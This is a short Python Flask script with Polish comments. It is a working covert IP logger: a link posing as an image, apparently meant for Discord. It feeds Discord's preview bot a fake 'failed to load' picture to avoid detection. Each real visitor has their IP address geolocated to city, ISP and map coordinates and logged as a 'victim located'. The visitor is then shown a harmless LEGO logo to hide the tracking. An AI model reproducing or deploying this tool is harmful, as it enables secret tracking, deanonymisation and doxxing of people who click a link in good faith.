from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# --- KONFIGURACJA ---
# Bezpośredni link do obrazka "Failed to load" z Twojego linku z Reddita
REDDIT_ERROR_IMG = "https://preview.redd.it/failed-to-load-image-on-mobile-v0-v9v846fbt01a1.png?width=1080&format=png&auto=webp&s=5568f1857948270139b8f2f458e0a3f6a27e029c"
# Prawdziwe zdjęcie LEGO dla człowieka
REAL_IMG = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png"

@app.route('/photo')
def logger():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    # 1. Jeśli to bot Discorda - dajemy mu obrazek błędu z Reddita
    if "Discordbot" in ua or "externalhit" in ua.lower():
        print(f"--- BOT DISCORDA WYKRYTY ---")
        return redirect(REDDIT_ERROR_IMG)

    # 2. LOGOWANIE DANYCH DO KONSOLI RENDERA (Zamiast Webhooka)
    print(f"\n[!!!] OFIARA NAMIERZONA [!!!]")
    print(f"IP: {ip}")
    
    try:
        # Pobieranie szczegółowej lokalizacji
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,lat,lon", timeout=5).json()
        if r.get("status") == "success":
            print(f"MIASTO: {r.get('city')}")
            print(f"REGION: {r.get('regionName')}")
            print(f"KRAJ: {r.get('country')}")
            print(f"DOSTAWCA: {r.get('isp')}")
            print(f"MAPA: https://www.google.com/maps?q={r.get('lat')},{r.get('lon')}")
    except Exception as e:
        print(f"Błąd lokalizacji: {e}")

    print(f"URZĄDZENIE: {ua}")
    print(f"-----------------------------------\n")

    # 3. Ofiara widzi logo LEGO
    return redirect(REAL_IMG)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
